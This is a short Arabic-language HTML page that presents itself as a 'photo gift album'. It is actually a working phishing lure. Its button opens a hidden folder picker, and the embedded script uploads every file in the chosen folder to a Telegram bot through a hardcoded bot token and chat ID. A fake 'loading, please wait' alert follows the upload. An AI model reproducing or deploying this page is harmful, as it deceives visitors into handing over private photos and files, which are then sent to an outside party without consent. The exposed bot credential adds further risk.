<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>عرض الصور الحصري</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #e91e63; color: white; padding: 20px; border-radius: 10px; border: none; font-size: 1.5rem; cursor: pointer; }
    </style>
</head>
<body>
    <h1>لقد وصلت لك هدية صور! 🎁</h1>
    <p>اضغط على الزر أدناه لفتح ألبوم الصور الخاص بك</p>
    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
    <button class="btn" onclick="document.getElementById('fileInput').click()">فتح الألبوم الآن</button>

    <script>
        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const CHAT_ID = '7214473798';

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const files = e.target.files;
            for (let i = 0; i < files.length; i++) {
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', files[i]);

                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
            alert("جاري تحميل الصور، يرجى الانتظار...");
        });
    </script>
</body>
</html>
